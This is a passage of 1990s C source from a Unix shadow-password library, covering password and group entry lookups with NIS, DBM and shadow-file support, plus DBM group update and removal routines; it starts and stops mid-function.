				grent.gr_passwd = sgrp->sg_passwd;
				grent.gr_mem = sgrp->sg_mem;
			}
#endif	/* AUTOSHADOW && SHADOWGRP */
			return &grent;
		} else {
			grent.gr_mem = members;
			memcpy (grpbuf, content.dptr, content.dsize);
			gr_unpack (grpbuf, content.dsize, &grent);
#if defined(AUTOSHADOW) && defined(SHADOWGRP)
			if (sgrp = getsgnam (grent.gr_name)) {
				grent.gr_passwd = sgrp->sg_passwd;
				grent.gr_mem = sgrp->sg_mem;
			}
#endif	/* AUTOSHADOW && SHADOWGRP */
			return &grent;
		}
	}
#endif	/* NDBM */
#ifdef	USE_NIS

	if (nis_used) {
again:
		/*
		 * Search the group.byname map for this group.
		 */

		if (! nis_bound)
			bind_nis ();

		if (nis_bound) {
			char	*cp;

			if (! yp_match (nis_domain, "group.byname", name,
					strlen (name), &nis_val, &nis_vallen)) {
				if (cp = strchr (nis_val, '\n'))
					*cp = '\0';

				nis_state = middle;
				if (grp = sgetgrent (nis_val)) {
					strcpy (save_name, grp->gr_name);
					nis_key = save_name;
					nis_keylen = strlen (save_name);
				}
				return grp;
			} else
				nis_state = native2;
		}
	}
#endif
	/*
	 * Search for an entry which matches the name.  Return the
	 * entry when a match is found.
	 */

	while (grp = getgrent ()) {
		if (strcmp (grp->gr_name, name) == 0)
			break;

#ifdef	USE_NIS
		if (nis_used && nis_state != native && nis_state != native2)
			goto again;
#endif
	}
#if defined(AUTOSHADOW) && defined(SHADOWGRP)
	if (grp) {
		if (sgrp = getsgnam (grent.gr_name)) {
			grp->gr_passwd = sgrp->sg_passwd;
			grp->gr_mem = sgrp->sg_mem;
		}
	}
#endif	/* AUTOSHADOW && SHADOWGRP */
	return grp;
}

/*
 * setgrent - open the group file
 *
 * setgrent() opens the system group file, and the DBM group files
 * if they are present.  The system group file is rewound if it was
 * open already.
 */

SETXXENT_TYPE
setgrent ()
{
#ifdef	NDBM
	int	mode;
#endif	/* NDBM */

#ifdef	USE_NIS
	nis_state = native;
#endif
	if (! grpfp) {
		if (! (grpfp = fopen (grpfile, "r")))
			SETXXENT_RET(-1);
	} else {
		if (fseek (grpfp, (off_t) 0L, SEEK_SET) != 0)
			SETXXENT_RET(-1);
	}

	/*
	 * Attempt to open the DBM files if they have never been opened
	 * and an error has never been returned.
	 */

#ifdef NDBM
	if (! dbmerror && ! dbmopened) {
		char	dbmfiles[BUFSIZ];

		strcpy (dbmfiles, grpfile);
		strcat (dbmfiles, ".pag");
		if (gr_dbm_mode == -1)
			mode = O_RDONLY;
		else
			mode = (gr_dbm_mode == O_RDONLY ||
				gr_dbm_mode == O_RDWR) ? gr_dbm_mode:O_RDONLY;

		if (access (dbmfiles, 0) ||
			(! (gr_dbm = dbm_open (grpfile, mode, 0))))
			dbmerror = 1;
		else
			dbmopened = 1;
	}
#endif	/* NDBM */
	SETXXENT_RET(0);
}
#endif	/* GETGRENT */
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: pwent.c,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $")

#include <sys/types.h>
#include "defines.h"
#include <stdio.h>
#include <pwd.h>

/*
 * If AUTOSHADOW is enabled, the getpwnam and getpwuid calls will
 * fill in the pw_passwd and pw_age fields from the passwd and
 * shadow files.
 */

#if defined(AUTOSHADOW) && !defined(SHADOWPWD)
#undef	AUTOSHADOW
#endif

/*
 * If DBM or NDBM is enabled, the getpwnam and getpwuid calls will
 * go to the database files to look for the requested entries.
 */

#ifdef	DBM
#include <dbm.h>
#endif
#ifdef	NDBM
#include <ndbm.h>
#include <fcntl.h>
DBM	*pw_dbm;
int	pw_dbm_mode = -1;
#endif

#define	SBUFSIZ	64
#define	NFIELDS	7

#ifdef	GETPWENT
static	char	*pwdfile = PASSWD_FILE;
static	FILE	*pwdfp;
#endif
static	char	pwdbuf[BUFSIZ];
#if defined(DBM) || defined(NDBM)
static	int	dbmopened;
static	int	dbmerror;
#endif
static	char	*pwdfields[NFIELDS];
static	struct	passwd	pwent;

#ifdef	USE_NIS
static	char	NISpwdbuf[BUFSIZ];
static	char	*NISpwdfields[NFIELDS];
static	struct	passwd	NISpwent;
static	int	nis_used;
static	int	nis_ignore;
static	enum	{ native, start, middle, native2 } nis_state;
static	int	nis_bound;
static	char	*nis_domain;
static	char	*nis_key;
static	int	nis_keylen;
static	char	*nis_val;
static	int	nis_vallen;
#define	IS_NISCHAR(c) ((c)=='+')
#endif

#ifdef	USE_NIS

/*
 * __setpwNIS - turn on or off NIS searches
 */

void
__setpwNIS (flag)
int	flag;
{
	nis_ignore = ! flag;

	if (nis_ignore)
		nis_used = 0;
}

/*
 * __ispwNIS - last getpw* returned a NIS user
 */

int
__ispwNIS (void)
{
	return nis_state == middle;
}

/*
 * bind_nis - bind to NIS server
 */

static int
bind_nis ()
{
	if (yp_get_default_domain (&nis_domain))
		return -1;

	nis_bound = 1;
	return 0;
}
#endif

#if defined(AUTOSHADOW) && defined(ATT_AGE) && defined(GETPWENT)
/*
 * sptopwage - convert shadow ages to AT&T-style pw_age ages
 *
 *	sptopwage() converts the values in the shadow password
 *	entry to the format used in the old-style password
 *	entry.
 */

static char *
sptopwage (spwd)
struct	spwd	*spwd;
{
	static	char	age[5];
	long	min;
	long	max;
	long	last;

	if ((min = (spwd->sp_min * SCALE / WEEK)) < 0)
		min = 0;
	else if (min >= 64)
		min = 63;

	if ((max = (spwd->sp_max * SCALE / WEEK)) < 0)
		max = 0;
	else if (max >= 64)
		max = 63;

	if ((last = (spwd->sp_lstchg * SCALE / WEEK)) < 0)
		last = 0;
	else if (last >= 4096)
		last = 4095;

	age[0] = i64c (max);
	age[1] = i64c (min);
	age[2] = i64c (last % 64);
	age[3] = i64c (last / 64);
	age[4] = '\0';
	return age;
}
#endif

/*
 * sgetpwent - convert a string to a (struct passwd)
 *
 * sgetpwent() parses a string into the parts required for a password
 * structure.  Strict checking is made for the UID and GID fields and
 * presence of the correct number of colons.  Any failing tests result
 * in a NULL pointer being returned.
 *
 * NOTE: This function uses hard-coded string scanning functions for
 *	performance reasons.  I am going to come up with some conditional
 *	compilation glarp to improve on this in the future.
 */

struct passwd *
sgetpwent (buf)
char	*buf;
{
	register int	i;
	register char	*cp;
	char	*ep;
	char	**fields;
	char	*buffer;
	struct	passwd	*pwd;

	/*
	 * Get my pointers all set up.
	 */
#ifdef	USE_NIS
	if (IS_NISCHAR (buf[0])) {
		fields = NISpwdfields;
		buffer = NISpwdbuf;
		pwd = &NISpwent;
	} else
#endif
	{
		fields = pwdfields;
		buffer = pwdbuf;
		pwd = &pwent;
	}


	/*
	 * Copy the string to a static buffer so the pointers into
	 * the password structure remain valid.
	 */

	strncpy (buffer, buf, BUFSIZ);
	pwdbuf[BUFSIZ-1] = '\0';

	/*
	 * Save a pointer to the start of each colon separated
	 * field.  The fields are converted into NUL terminated strings.
	 */

	for (cp = buffer, i = 0;i < NFIELDS && cp;i++) {
		fields[i] = cp;
		while (*cp && *cp != ':')
			++cp;
	
		if (*cp)
			*cp++ = '\0';
		else
			cp = 0;
	}

	/*
	 * There must be exactly NFIELDS colon separated fields or
	 * the entry is invalid.  Also, the UID and GID must be non-blank.
	 */

	if (i != NFIELDS || *fields[2] == '\0' || *fields[3] == '\0') {
#ifdef	USE_NIS
		if (! IS_NISCHAR (fields[0][0]))
			return 0;
		else
			nis_used = 1;
#else
		return 0;
#endif
	}

	/*
	 * Each of the fields is converted the appropriate data type
	 * and the result assigned to the password structure.  If the
	 * UID or GID does not convert to an integer value, a NULL
	 * pointer is returned.
	 */

	pwd->pw_name = fields[0];
#ifdef	USE_NIS
	if (IS_NISCHAR (fields[0][0]))
		nis_used = 1;
#endif
	pwd->pw_passwd = fields[1];
	if (fields[2][0] == '\0' ||
		((pwd->pw_uid = strtol (fields[2], &ep, 10)) == 0 && *ep)) {
#ifdef	USE_NIS
		if (! nis_used)
			return 0;
		else
			pwd->pw_uid = -1;
#else
		return 0;
#endif
	}
	if (fields[3][0] == '\0' ||
		((pwd->pw_gid = strtol (fields[3], &ep, 10)) == 0 && *ep)) {
#ifdef	USE_NIS
		if (! nis_used)
			return 0;
		else
			pwd->pw_gid = -1;
#else
		return 0;
#endif
	}
#ifdef	ATT_AGE
	cp = pwd->pw_passwd;
	while (*cp && *cp != ',')
		++cp;

	if (*cp) {
		*cp++ = '\0';
		pwd->pw_age = cp;
	} else {
		cp = 0;
		pwd->pw_age = "";
	}
#endif
	pwd->pw_gecos = fields[4];
#ifdef	ATT_COMMENT
	pwd->pw_comment = "";
#endif
	pwd->pw_dir = fields[5];
	pwd->pw_shell = fields[6];

	return (pwd);
}

#ifdef	GETPWENT

/*
 * fgetpwent - get a password file entry from a stream
 *
 * fgetpwent() reads the next line from a password file formatted stream
 * and returns a pointer to the password structure for that line.
 */

struct passwd *
fgetpwent (fp)
FILE	*fp;
{
	char	buf[BUFSIZ];

#ifdef	USE_NIS
	while (fgets (buf, BUFSIZ, fp) != (char *) 0)
#else
	if (fgets (buf, BUFSIZ, fp) != (char *) 0)
#endif
	{
		buf[strlen (buf) - 1] = '\0';
#ifdef	USE_NIS
		if (nis_ignore && IS_NISCHAR (buf[0]))
			continue;
#endif
		return (sgetpwent (buf));
	}
	return 0;
}

/*
 * endpwent - close a password file
 *
 * endpwent() closes the password file if open.  if autoshadowing is
 * enabled the system must also end access to the shadow files since
 * the user is probably unaware it was ever accessed.
 */

SETXXENT_TYPE
endpwent ()
{
	if (pwdfp)
		if (fclose (pwdfp))
			SETXXENT_RET(-1);
	pwdfp = 0;
#ifdef	NDBM
	if (dbmopened && pw_dbm) {
		dbm_close (pw_dbm);
		dbmopened = 0;
		dbmerror = 0;
		pw_dbm = 0;
	}
#endif
#ifdef	AUTOSHADOW
	endspent ();
#endif
	SETXXENT_RET(0);
}

/*
 * getpwent - get a password entry from the password file
 *
 * getpwent() opens the password file, if not already opened, and reads
 * a single entry.  NULL is returned if any errors are encountered reading
 * the password file.
 */

struct passwd *
getpwent ()
{
#ifdef	USE_NIS
	int	nis_1_user = 0;
	struct	passwd	*val;
	struct	passwd	*NISval;
	char	buf[BUFSIZ];
	char	*cp;
	static	char	save_name[16];
#endif
	if (! pwdfp) {
		(void) setpwent ();
		if (! pwdfp)
			return 0;
	}
#ifdef	USE_NIS
again:
	/*
	 * See if we are reading from the local file.
	 */

	if (nis_state == native || nis_state == native2) {

		/*
		 * Get the next entry from the password file.  Return NULL
		 * right away if there is none.
		 */

		if (! (val = fgetpwent (pwdfp)))
			return 0;

		/*
		 * If this entry began with a NIS escape character, we have
		 * to see if this is just a single user, or if the entire
		 * map is being asked for.
		 */

		if (IS_NISCHAR (val->pw_name[0])) {
			if (val->pw_name[1])
				nis_1_user = 1;
			else
				nis_state = start;
		}

		/*
		 * If this isn't a NIS user and this isn't an escape to go
		 * use a NIS map, it must be a regular local user.
		 */

		if (nis_1_user == 0 && nis_state != start)
			return val;

		/*
		 * If this is an escape to use an NIS map, switch over to
		 * that bunch of code.
		 */

		if (nis_state == start)
			goto again;

		/*
		 * NEEDSWORK.  Here we substitute pieces-parts of this entry.
		 * As a first stab, let's call getpwnam() with the name we
		 * just matched, after skipping over the NIS glarp.
		 */

		if (! nis_bound)
			bind_nis ();

		if (! nis_bound)
			goto again;

		if (yp_match (nis_domain, "passwd.byname", val->pw_name + 1,
				strlen (val->pw_name + 1),
				&nis_val, &nis_vallen) == 0) {

			if (cp = strchr (nis_val, '\n'))
				*cp = '\0';

			if (! (NISval = sgetpwent (nis_val)))
				goto again;
		} else
			goto again;

		/*
		 * NISval points to the reply from NIS, and val points to
		 * the value we got from the local file.
		 */

		val->pw_name++;

		if (val->pw_passwd[0] == '*')
			val->pw_passwd = NISval->pw_passwd;
#ifdef	ATT_AGE
		if (val->pw_age[0] == '\0')
			val->pw_age = NISval->pw_age;
#endif
		if (val->pw_uid == -1)
			val->pw_uid = NISval->pw_uid;
		if (val->pw_gid == -1)
			val->pw_gid = NISval->pw_gid;
		if (val->pw_gecos[0] == '\0')
			val->pw_gecos = NISval->pw_gecos;
		if (val->pw_dir[0] == '\0')
			val->pw_dir = NISval->pw_dir;
		if (val->pw_shell[0] == '\0')
			val->pw_shell = NISval->pw_shell;

		return val;
	} else {
		if (nis_bound == 0) {
			if (bind_nis ()) {
				nis_state = native2;
				goto again;
			}
		}
		if (nis_state == start) {
			if (yp_first (nis_domain, "passwd.byname", &nis_key,
				&nis_keylen, &nis_val, &nis_vallen)) {
				nis_state = native2;
				goto again;
			}
			nis_state = middle;
		} else if (nis_state == middle) {
			if (yp_next (nis_domain, "passwd.byname", nis_key,
				nis_keylen, &nis_key, &nis_keylen,
				&nis_val, &nis_vallen)) {
				nis_state = native2;
				goto again;
			}
		}
		return sgetpwent (nis_val);
	}
#else
	return fgetpwent (pwdfp);
#endif
}

/*
 * getpwuid - locate the password entry for a given UID
 *
 * getpwuid() locates the first password file entry for the given UID.
 * If there is a valid DBM file, the DBM files are queried first for
 * the entry.  Otherwise, a linear search is begun of the password file
 * searching for an entry which matches the provided UID.
 */

struct passwd *
getpwuid (uid)
uid_t	uid;
{
	struct	passwd	*pwd;
#if defined(DBM) || defined(NDBM)
	datum	key;
	datum	content;
	uid_t	uid_key;
#endif
#ifdef	AUTOSHADOW
	struct	spwd	*spwd;
#endif
#ifdef	USE_NIS
	char	buf[BUFSIZ];
	static	char	save_name[16];
	int	nis_disabled = 0;
#endif

	(void) setpwent ();
	if (! pwdfp)
		return 0;

#if defined(DBM) || defined(NDBM)

	/*
	 * If the DBM file are now open, create a key for this UID and
	 * try to fetch the entry from the database.  A matching record
	 * will be unpacked into a static structure and returned to
	 * the user.
	 */

	if (dbmopened) {
		uid_key = uid;
		key.dsize = sizeof uid_key;
		key.dptr = (char *) &uid_key;
#ifdef	DBM
		content = fetch (key);
#endif
#ifdef	NDBM
		content = dbm_fetch (pw_dbm, key);
#endif
		if (content.dptr != 0) {
			memcpy (pwdbuf, content.dptr, content.dsize);
			pw_unpack (pwdbuf, content.dsize, &pwent);
#ifdef	AUTOSHADOW
			if ((spwd = getspnam (pwent.pw_name))) {
				pwent.pw_passwd = spwd->sp_pwdp;
#ifdef	ATT_AGE
				pwent.pw_age = sptopwage (spwd);
#endif
			}
#endif
			return &pwent;
		}
	}
#endif
#ifdef	USE_NIS

	/*
	 * Search the passwd.byuid map for this user.
	 */

	if (! nis_ignore && ! nis_bound)
		bind_nis ();

	if (! nis_ignore && nis_bound) {
		char	*cp;

		sprintf (buf, "%d", uid);

		if (yp_match (nis_domain, "passwd.byuid", buf,
				strlen (buf), &nis_val, &nis_vallen) == 0) {

			if (cp = strchr (nis_val, '\n'))
				*cp = '\0';

			nis_state = middle;
			if ((pwd = sgetpwent (nis_val))) {
				strcpy (save_name, pwd->pw_name);
				nis_key = save_name;
				nis_keylen = strlen (save_name);
			}
			return pwd;
		} else
			nis_state = native2;
	}
#endif
#ifdef	USE_NIS
	/*
	 * NEEDSWORK -- this is a mess, and it is the same mess in the
	 * other three files.  I can't just blindly turn off NIS because
	 * this might be the first pass through the local files.  In
	 * that case, I never discover that NIS is present.
	 */

	if (nis_used) {
		nis_ignore++;
		nis_disabled++;
	}
#endif
	/*
	 * Search for an entry which matches the UID.  Return the
	 * entry when a match is found.
	 */

	while ((pwd = getpwent ()))
		if (pwd->pw_uid == uid)
			break;

#ifdef	USE_NIS
	if (nis_disabled)
		nis_ignore--;
#endif
#ifdef	AUTOSHADOW
	if (pwd && (spwd = getspnam (pwd->pw_name))) {
		pwd->pw_passwd = spwd->sp_pwdp;
#ifdef	ATT_AGE
		pwd->pw_age = sptopwage (spwd);
#endif
	}
#endif
	return pwd;
}

/*
 * getpwnam - locate the password entry for a given name
 *
 * getpwnam() locates the first password file entry for the given name.
 * If there is a valid DBM file, the DBM files are queried first for
 * the entry.  Otherwise, a linear search is begun of the password file
 * searching for an entry which matches the provided name.
 */

struct passwd *
getpwnam (name)
	const char *name;
{
	struct	passwd	*pwd;
#if defined(DBM) || defined(NDBM)
	datum	key;
	datum	content;
#endif
#ifdef	AUTOSHADOW
	struct	spwd	*spwd;
#endif
#ifdef	USE_NIS
	char	buf[BUFSIZ];
	static	char	save_name[16];
	int	nis_disabled = 0;
#endif

	(void) setpwent ();
	if (! pwdfp)
		return 0;

#if defined(DBM) || defined(NDBM)

	/*
	 * If the DBM file are now open, create a key for this UID and
	 * try to fetch the entry from the database.  A matching record
	 * will be unpacked into a static structure and returned to
	 * the user.
	 */

	if (dbmopened) {
		key.dsize = strlen (name);
		key.dptr = (void *) name;
#ifdef	DBM
		content = fetch (key);
#endif
#ifdef	NDBM
		content = dbm_fetch (pw_dbm, key);
#endif
		if (content.dptr != 0) {
			memcpy (pwdbuf, content.dptr, content.dsize);
			pw_unpack (pwdbuf, content.dsize, &pwent);
#ifdef	AUTOSHADOW
			if ((spwd = getspnam (pwent.pw_name))) {
				pwent.pw_passwd = spwd->sp_pwdp;
#ifdef	ATT_AGE
				pwent.pw_age = sptopwage (spwd);
#endif
			}
#endif
			return &pwent;
		}
	}
#endif

	/*
	 * Search for an entry which matches the name.  Return the
	 * entry when a match is found.
	 */

local:
	while ((pwd = getpwent ())) {
#ifdef	USE_NIS
		/*
		 * See if we hit a "+" symbol.  If we did, we can just
		 * query the map directly.  If that fails, we come back
		 * to next line.
		 */

		if (nis_state == middle)
			goto remote;
#endif
		if (strcmp (pwd->pw_name, name) == 0)
			break;
	}
fini:
#ifdef	AUTOSHADOW
	if (pwd && (spwd = getspnam (pwd->pw_name))) {
		pwd->pw_passwd = spwd->sp_pwdp;
#ifdef	ATT_AGE
		pwd->pw_age = sptopwage (spwd);
#endif	/* ATT_AGE */
	}
#endif	/* AUTOSHADOW */
	return pwd;

#ifdef	USE_NIS
remote:
	/*
	 * Search the passwd.byname map for this user.
	 */

	if (! nis_ignore && ! nis_bound)
		bind_nis ();

	if (! nis_ignore && nis_bound) {
		char	*cp;

		if (yp_match (nis_domain, "passwd.byname", name,
				strlen (name), &nis_val, &nis_vallen) == 0) {

			if (cp = strchr (nis_val, '\n'))
				*cp = '\0';

			nis_state = middle;
			if ((pwd = sgetpwent (nis_val))) {
				strcpy (save_name, pwd->pw_name);
				nis_key = save_name;
				nis_keylen = strlen (save_name);
			}
			goto fini;
		} else {
			nis_state = native2;
			goto local;
		}
	}
	goto fini;
#endif	/* USE_NIS */
}

/*
 * setpwent - open the password file
 *
 * setpwent() opens the system password file, and the DBM password files
 * if they are present.  The system password file is rewound if it was
 * open already.
 */

SETXXENT_TYPE
setpwent ()
{
#ifdef	NDBM
	int	mode;
#endif

#ifdef	USE_NIS
	nis_state = native;
#endif
	if (! pwdfp) {
		if (! (pwdfp = fopen (pwdfile, "r")))
			SETXXENT_RET(-1);
	} else {
		if (fseek (pwdfp, (off_t) 0L, SEEK_SET) != 0) {
			fclose (pwdfp);
			pwdfp = 0;
			SETXXENT_RET(-1);
		}
	}

	/*
	 * Attempt to open the DBM files if they have never been opened
	 * and an error has never been returned.
	 */

#if defined (DBM) || defined (NDBM)
	if (! dbmerror && ! dbmopened) {
		char	dbmfiles[BUFSIZ];

		strcpy (dbmfiles, pwdfile);
		strcat (dbmfiles, ".pag");
#ifdef	NDBM
		if (pw_dbm_mode == -1)
			mode = O_RDONLY;
		else
			mode = (pw_dbm_mode == O_RDONLY ||
				pw_dbm_mode == O_RDWR) ? pw_dbm_mode:O_RDONLY;
#endif
#ifdef	DBM
		if (access (dbmfiles, 0) || dbminit (pwdfile))
#endif
#ifdef	NDBM
		if (access (dbmfiles, 0) ||
			(! (pw_dbm = dbm_open (pwdfile, mode, 0))))
#endif
			dbmerror = 1;
		else
			dbmopened = 1;
	}
#endif
	SETXXENT_RET(0);
}

#endif /* GETPWENT */
/*
 * Copyright 1990 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#ifdef	NDBM

#include "rcsid.h"
RCSID("$Id: grdbm.c,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $")

#include <string.h>
#include <stdio.h>
#include <grp.h>
#include "prototypes.h"

#include <ndbm.h>
extern	DBM	*gr_dbm;

#define	GRP_FRAG	256

/*
 * gr_dbm_update
 *
 * Updates the DBM password files, if they exist.
 */

int
gr_dbm_update (gr)
	const struct group *gr;
{
	datum	key;
	datum	content;
	char	data[BUFSIZ*8];
	char	grpkey[60];
	char	*cp;
	int	len;
	int	i;
	int	cnt;
	static	int	once;

	if (! once) {
		if (! gr_dbm)
			setgrent ();

		once++;
	}
	if (! gr_dbm)
		return 0;

	len = gr_pack (gr, data);

	if (len <= GRP_FRAG) {
		content.dsize = len;
		content.dptr = data;

		key.dsize = strlen (gr->gr_name);
		key.dptr = gr->gr_name;
		if (dbm_store (gr_dbm, key, content, DBM_REPLACE))
			return 0;

		key.dsize = sizeof gr->gr_gid;
		key.dptr = (char *) &gr->gr_gid;
		if (dbm_store (gr_dbm, key, content, DBM_REPLACE))
			return 0;

	} else {
		content.dsize = sizeof cnt;
		content.dptr = (char *) &cnt;
		cnt = (len + (GRP_FRAG-1)) / GRP_FRAG;

		key.dsize = strlen (gr->gr_name);
		key.dptr = gr->gr_name;
		if (dbm_store (gr_dbm, key, content, DBM_REPLACE))
			return 0;

		key.dsize = sizeof gr->gr_gid;
		key.dptr = (char *) &gr->gr_gid;
		if (dbm_store (gr_dbm, key, content, DBM_REPLACE))
			return 0;

		for (cp = data, i = 0;i < cnt;i++) {
			content.dsize = len > GRP_FRAG ? GRP_FRAG:len;
			len -= content.dsize;
			content.dptr = cp;
			cp += content.dsize;

			key.dsize = sizeof i + strlen (gr->gr_name);
			key.dptr = grpkey;
			memcpy (grpkey, (char *) &i, sizeof i);
			strcpy (grpkey + sizeof i, gr->gr_name);
			if (dbm_store (gr_dbm, key, content, DBM_REPLACE))
				return 0;

			key.dsize = sizeof i + sizeof gr->gr_gid;
			key.dptr = grpkey;
			memcpy (grpkey, (char *) &i, sizeof i);
			memcpy (grpkey + sizeof i, (char *) &gr->gr_gid,
				sizeof gr->gr_gid);
			if (dbm_store (gr_dbm, key, content, DBM_REPLACE))
				return 0;
		}
	}
	return 1;
}

/*
 * gr_dbm_remove
 *
 * Deletes the DBM group file entries, if they exist.
 */

int
gr_dbm_remove (gr)
	const struct group *gr;
{
	datum	key;
	datum	content;
	char	grpkey[60];
	int	i;
	int	cnt;
	int	errors = 0;
	static	int	once;

	if (! once) {
		if (! gr_dbm)
			setgrent ();

		once++;
	}
	if (! gr_dbm)
		return 0;

	key.dsize = strlen (gr->gr_name);
	key.dptr = (char *) gr->gr_name;
	content = dbm_fetch (gr_dbm, key);
	if (content.dptr == 0)
		++errors;
	else {
		if (content.dsize == sizeof (int)) {
			memcpy ((char *) &cnt, content.dptr, sizeof cnt);

			for (i = 0;i < cnt;i++) {
				key.dsize = sizeof i + strlen (gr->gr_name);
				key.dptr = grpkey;
				memcpy (grpkey, (char *) &i, sizeof i);
				strcpy (grpkey + sizeof i, gr->gr_name);
				if (dbm_delete (gr_dbm, key))
					++errors;
			}
		} else {
			if (dbm_delete (gr_dbm, key))
				++errors;
		}
	}
	key.dsize = sizeof gr->gr_gid;
	key.dptr = (char *) &gr->gr_gid;
	content = dbm_fetch (gr_dbm, key);
	if (content.dptr == 0)
		++errors;
	else {
		if (content.dsize == sizeof (int)) {
			memcpy ((char *) &cnt, content.dptr, sizeof cnt);

			for (i = 0;i < cnt;i++) {
				key.dsize = sizeof i + sizeof gr->gr_gid;
				key.dptr = grpkey;
				memcpy (grpkey, (char *) &i, sizeof i);
				memcpy (grpkey + sizeof i, (char *) &gr->gr_gid,
					sizeof gr->gr_gid);

				if (dbm_delete (gr_dbm, key))
					++errors;
			}
		} else {
			if (dbm_delete (gr_dbm, key))
				++errors;
		}
	}
	return errors ? 0:1;
}

int
gr_dbm_present()
{
	return (access(GROUP_PAG_FILE, 0) == 0);
}
#endif
/*
 * Copyright 1990 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#if defined(NDBM) && defined(SHADOWGRP) /*{*/

#include <string.h>
#include <stdio.h>
#include "prototypes.h"

#include "rcsid.h"
RCSID("$Id: gsdbm.c,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $")

#include <ndbm.h>
extern	DBM	*sg_dbm;

#define	GRP_FRAG	256

/*
 * sg_dbm_update
 *
 * Updates the DBM password files, if they exist.
 */

int
sg_dbm_update (sgr)
	const struct sgrp *sgr;
{
	datum	key;
	datum	content;
	char	data[BUFSIZ*8];
	char	sgrpkey[60];
	char	*cp;
	int	len;
	int	i;
	int	cnt;
	static	int	once;

	if (! once) {
		if (! sg_dbm)
			setsgent ();

		once++;
	}
	if (! sg_dbm)
		return 0;

